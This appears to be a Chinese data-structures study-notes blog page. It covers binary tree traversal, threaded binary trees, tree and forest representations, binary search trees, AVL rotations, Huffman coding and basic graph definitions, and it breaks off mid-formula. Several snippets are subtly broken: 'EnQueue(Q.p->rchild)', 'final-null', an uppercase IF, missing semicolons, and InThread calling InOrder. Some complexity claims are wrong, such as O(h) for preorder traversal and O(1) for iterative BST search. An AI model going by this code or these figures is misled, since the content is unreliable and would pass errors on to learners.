<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709130230793.png" alt="image-20220709130230793"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709130623105.png" alt="image-20220709130623105"></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        visit(T);            <span class="comment">//访问根节点</span></span><br><span class="line">        PreOrder(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">        PreOrder(T-&gt;rchild); <span class="comment">//递归遍历右子树0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度为O(h)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709192542556.png" alt="image-20220709192542556"><br>先序遍历——第一次路过时访问结点<br>中序遍历——第二次路过时访问结点<br>后序遍历——第三次路过时访问结点<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709192656825.png" alt="image-20220709192656825"></p>
<h3 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treeDepth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    IF(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> l = treeDepth(T-&gt;lchild);</span><br><span class="line">        <span class="type">int</span> r = treeDepth(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">return</span> l&gt;r? l+<span class="number">1</span>:r+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a>二叉树的层序遍历</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709193412735.png" alt="image-20220709193412735"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二叉树的结点（链式存储）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式队列结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    BiTNode * data;           <span class="comment">//存指针而不是结点来节省空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;<span class="comment">//队头队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//层序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);  <span class="comment">//初始化</span></span><br><span class="line">    BiTree p;</span><br><span class="line">    EnQueue(Q,T);    <span class="comment">//将根节点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!IsEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,p);   <span class="comment">//队头结点出队</span></span><br><span class="line">        visit(p);       <span class="comment">//访问出队结点</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lchild!=null)</span><br><span class="line">            EnQueue(Q,p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rchild!=null)</span><br><span class="line">            EnQueue(Q.p-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="由遍历序列构造二叉树"><a href="#由遍历序列构造二叉树" class="headerlink" title="由遍历序列构造二叉树"></a>由遍历序列构造二叉树</h2><p>给定一个前中后序遍历序列可能对应多种二叉树<br>给定中序加一种其他序（前序后序层序）对应唯一二叉树</p>
<h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p>普通二叉树不能从任意一个指定结点开始遍历<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709200423798.png" alt="image-20220709200423798"></p>
<h3 id="线索二叉树-1"><a href="#线索二叉树-1" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709200709261.png" alt="image-20220709200709261"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709200930693.png" alt="image-20220709200930693"></p>
<h3 id="土办法找前驱"><a href="#土办法找前驱" class="headerlink" title="土办法找前驱"></a>土办法找前驱</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//辅助全局变量，用于查找结点p的前驱</span></span><br><span class="line">BiTNode *p;</span><br><span class="line">BiTNode *pre=null;</span><br><span class="line">BiTNode *final-null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问结点q</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(BiTNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==p)</span><br><span class="line">        final = pre;     <span class="comment">//找到p的前驱</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        pre = q;       <span class="comment">//pre指向当前访问的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量pre，指向当前访问结点的前驱</span></span><br><span class="line">ThreadNode *pre=null;</span><br><span class="line"><span class="comment">//中序线索化二叉树T</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateInThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    pre=null;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InThread(T);</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;rchild==null)</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//线索二叉树的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,* ThreadTree;</span><br><span class="line"><span class="comment">//中序遍历二叉树，一边遍历一边线索化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(ThreadNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;lchild==null)&#123;</span><br><span class="line">        q-&gt;lchild=pre;</span><br><span class="line">        q-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre!=null&amp;&amp;pre-&gt;rchild==null)&#123;</span><br><span class="line">        pre-&gt;rchild=q;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pre=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709204642583.png" alt="image-20220709204642583"></p>
<h2 id="在线索二叉树中找前驱后继"><a href="#在线索二叉树中找前驱后继" class="headerlink" title="在线索二叉树中找前驱后继"></a>在线索二叉树中找前驱后继</h2><h3 id="中序后继"><a href="#中序后继" class="headerlink" title="中序后继"></a>中序后继</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709205639652.png" alt="image-20220709205639652"><br>该方法的时间复杂度是O（1)</p>
<h3 id="中序前驱"><a href="#中序前驱" class="headerlink" title="中序前驱"></a>中序前驱</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709205928279.png" alt="image-20220709205928279"></p>
<h3 id="先序前驱"><a href="#先序前驱" class="headerlink" title="先序前驱"></a>先序前驱</h3><p>二叉链表没办法找到先序前驱<br>将二叉链表转化为三叉链表<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709210518474.png" alt="image-20220709210518474"></p>
<h3 id="后序前驱"><a href="#后序前驱" class="headerlink" title="后序前驱"></a>后序前驱</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709211254569.png" alt="image-20220709211254569"></p>
<h3 id="后序后继"><a href="#后序后继" class="headerlink" title="后序后继"></a>后序后继</h3><p>p.rtag==0，则一定有右孩子，所以只能用土办法来找</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709210913690.png" alt="image-20220709210913690"></p>
<p>p为根节点则没有后序后继</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709211007944.png" alt="image-20220709211007944"></p>
<h2 id="树的逻辑结构"><a href="#树的逻辑结构" class="headerlink" title="树的逻辑结构"></a>树的逻辑结构</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709211533787.png" alt="image-20220709211533787"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;PTree;</span><br></pre></td></tr></table></figure>
<h3 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709212419211.png" alt="image-20220709212419211"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> child;   <span class="comment">//孩子结点在数组中的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span>   <span class="comment">//下一个改组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">fistchild</span>;</span> <span class="comment">//第一个孩子</span></span><br><span class="line">&#125; CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    CTBox nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n,r    <span class="comment">//结点数和根的位置</span></span><br><span class="line">&#125;CTree</span><br></pre></td></tr></table></figure>
<h3 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>&#123;</span></span><br><span class="line">    ElemType data;   <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span>  <span class="comment">//第一个孩子和右兄弟指针</span></span><br><span class="line">&#125;CSNode,*CSTree</span><br></pre></td></tr></table></figure>
<h3 id="森林和二叉树的转换"><a href="#森林和二叉树的转换" class="headerlink" title="森林和二叉树的转换"></a>森林和二叉树的转换</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709213548106.png" alt="image-20220709213548106"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709213700619.png" alt="image-20220709213700619"></p>
<h2 id="树和森林的遍历"><a href="#树和森林的遍历" class="headerlink" title="树和森林的遍历"></a>树和森林的遍历</h2><h3 id="树的先根遍历"><a href="#树的先根遍历" class="headerlink" title="树的先根遍历"></a>树的先根遍历</h3><p>若树非空，先访问根节点，再依次对每棵子树进行先根遍历</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(R!=null)&#123;</span><br><span class="line">        visit(R);</span><br><span class="line">        <span class="keyword">while</span>(R还有下一个子树T)</span><br><span class="line">            PreOrder(T);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>树的先根遍历与二叉树的先序遍历相同<br>深度优先遍历</p>
<h3 id="树的后根遍历"><a href="#树的后根遍历" class="headerlink" title="树的后根遍历"></a>树的后根遍历</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709230748352.png" alt="image-20220709230748352"></p>
<p>树的后根遍历与二叉树的中序遍历相同<br>深度优先遍历</p>
<h3 id="树的层次遍历-1"><a href="#树的层次遍历-1" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231031413.png" alt="image-20220709231031413"><br>树的层次遍历与二叉树的层序遍历相同<br>广度优先遍历</p>
<h3 id="森林的先序遍历"><a href="#森林的先序遍历" class="headerlink" title="森林的先序遍历"></a>森林的先序遍历</h3><p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231345040.png" alt="image-20220709231345040"><br>可以先转换成二叉树，在对二叉树进行先序遍历</p>
<h3 id="森林的后根遍历"><a href="#森林的后根遍历" class="headerlink" title="森林的后根遍历"></a>森林的后根遍历</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231520092.png" alt="image-20220709231520092"></p>
<p>可以先转换成二叉树，在对二叉树进行中序遍历<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231626512.png" alt="image-20220709231626512"></p>
<h2 id="二叉排序树（BST）"><a href="#二叉排序树（BST）" class="headerlink" title="二叉排序树（BST）"></a>二叉排序树（BST）</h2><p>二叉查找树<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231736496.png" alt="image-20220709231736496"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231745186.png" alt="image-20220709231745186"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231900686.png" alt="image-20220709231900686"></p>
<h3 id="查找-2"><a href="#查找-2" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(T!=null&amp;&amp;key!=T-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=T-&gt;rchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//时间复杂度O(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归实现</span></span><br><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==null)</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    <span class="keyword">if</span>(key==T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> T;    <span class="comment">//查找成功</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;lchild,key);   <span class="comment">//在左子树中查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;rchild,key);   <span class="comment">//在右子树中查找</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度O(h)</span></span><br></pre></td></tr></table></figure>
<h3 id="插入-3"><a href="#插入-3" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709232619239.png" alt="image-20220709232619239"><br>注意插入操作是引用类型<br>最坏空间复杂度O(h)</p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709232821433.png" alt="image-20220709232821433"></p>
<h3 id="删除-3"><a href="#删除-3" class="headerlink" title="删除"></a>删除</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709233303115.png" alt="image-20220709233303115"></p>
<h2 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h2><p>查找成功的平均长度ASL<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709233912561.png" alt="image-20220709233912561"></p>
<script type="math/tex; mode=display">
尽可能达到O(log_2n)</script><p>查找失败的平均查找长度<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709234322040.png" alt="image-20220709234322040"></p>
<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>简称平衡树（AVL树）——树上任一结点的左子树和右子树的高度之差不超过1<br><strong>结点的平衡因子</strong>=左子树高-右子树高<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709234821736.png" alt="image-20220709234821736"></p>
<h3 id="平衡二叉树的插入"><a href="#平衡二叉树的插入" class="headerlink" title="平衡二叉树的插入"></a>平衡二叉树的插入</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709234957697.png" alt="image-20220709234957697"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235020317.png" alt="image-20220709235020317"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235353920.png" alt="image-20220709235353920"><br>假设的子树的高度一定都是统一的一个值H</p>
<h4 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235550956.png" alt="image-20220709235550956"></p>
<h4 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235832689.png" alt="image-20220709235832689"></p>
<h4 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000110322.png" alt="image-20220710000110322"></p>
<h4 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000356369.png" alt="image-20220710000356369"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000444260.png" alt="image-20220710000444260"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000533083.png" alt="image-20220710000533083"></p>
<h4 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000716645.png" alt="image-20220710000716645"></p>
<p><strong>插入操作导致最小不平衡子树高度+1，经过调整后高度恢复</strong></p>
<h3 id="查找效率问题"><a href="#查找效率问题" class="headerlink" title="查找效率问题"></a>查找效率问题</h3><h3 id="最坏时间复杂度O-h"><a href="#最坏时间复杂度O-h" class="headerlink" title="最坏时间复杂度O(h)"></a>最坏时间复杂度O(h)</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710001904807.png" alt="image-20220710001904807"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710001932928.png" alt="image-20220710001932928"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710001948415.png" alt="image-20220710001948415"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710002053754.png" alt="image-20220710002053754"></p>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>结点的权：有某种现实含义（如：表示节点的重要性）<br>结点的带权路径长度：从树的跟到该结点的路径长度（经过的边数）与该结点上权值的乘积<br>树的带权路径长度（WPL)：书中所有的叶子结点的带权路径长度之和<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710002632003.png" alt="image-20220710002632003"><br>哈夫曼树的结点总数为2n-1<br>哈夫曼树中不存在度为1的结点<br>哈夫曼树并不唯一，但WPL必然相同且为最优</p>
<h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>固定长度编码——每个字都用相等长度的二进制位表示（ASCII编码）</p>
<p>可变长度编码<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710003458543.png" alt="image-20220710003458543"><br>前缀编码：没有一个编码是另一个编码的前缀</p>
<h1 id="第六章——图"><a href="#第六章——图" class="headerlink" title="第六章——图"></a>第六章——图</h1><h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><h3 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803205115991.png" alt="image-20220803205115991"><br>图的边集可以为空集，边集可以有方向也可以没方向</p>
<p><strong>图逻辑结构的应用</strong><br>微信好友关系     地铁站（顶点集）铁路</p>
<h3 id="无向图，有向图"><a href="#无向图，有向图" class="headerlink" title="无向图，有向图"></a>无向图，有向图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803205427477.png" alt="image-20220803205427477"><br>无向图边集用（)  有向图边集用&lt;&gt;</p>
<h3 id="简单图、多重图"><a href="#简单图、多重图" class="headerlink" title="简单图、多重图"></a>简单图、多重图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803205904593.png" alt="image-20220803205904593"></p>
<h3 id="顶点的度、入度、出度"><a href="#顶点的度、入度、出度" class="headerlink" title="顶点的度、入度、出度"></a>顶点的度、入度、出度</h3><p>无向图：<strong>顶点v的度</strong>是该顶点边的条数，记为TD(v)<br>有向图：<strong>顶点v的入度</strong>是以顶点v为终点的有向边的数目，记为ID(v)<br>              <strong>顶点v的出度</strong>是以顶点v为起点的有向边的数目，记为OD(v)<br>              <strong>顶点v的度</strong>等于入度和出度的和，即TD(v)=ID(v)+OD(v)</p>
<script type="math/tex; mode=display">
n个顶点，e条边\\无向图：\sum_{i=1}^{n}TD(v_i)=2e\\有向图：\sum_{i=1}^nID(v_i)=\sum_{i=1}^nOD(v_i)=e</script><h3 id="顶点-顶点的关系描述"><a href="#顶点-顶点的关系描述" class="headerlink" title="顶点-顶点的关系描述"></a>顶点-顶点的关系描述</h3><p>路径——顶点A到顶点E之间的一条路径是指顶点序列（A,B,C,D,E)<br>回路—— 第一个顶点和最后一个顶点相同的路径称为<strong>回路或者环</strong><br>简单路径——路径序列中顶点不重复出现的路径<br>简单回路——除第一个顶点和最后一个顶点外，其余顶点不重复出现<br>路径长度——路径上边的数目<br>点到点的距离——最短路径的长度（若不存在路径记为无穷）<br>无向图中，若从顶点v到顶点w有路径存在，则成v和w是连通的<br>有向图中，若从顶点v到顶点w和从顶点w到顶点v之间都有路径，则称这两个顶点是强连通的</p>
<h3 id="连通图、强连通图"><a href="#连通图、强连通图" class="headerlink" title="连通图、强连通图"></a>连通图、强连通图</h3><p>无向图：若图G任意两个顶点都是连通的，则称图G为连通图，否则为非连通图<br>有向图：若图G任何一对顶点都是强连通的，则称此图为强连通图</p>
<script type="math/tex; mode=display">
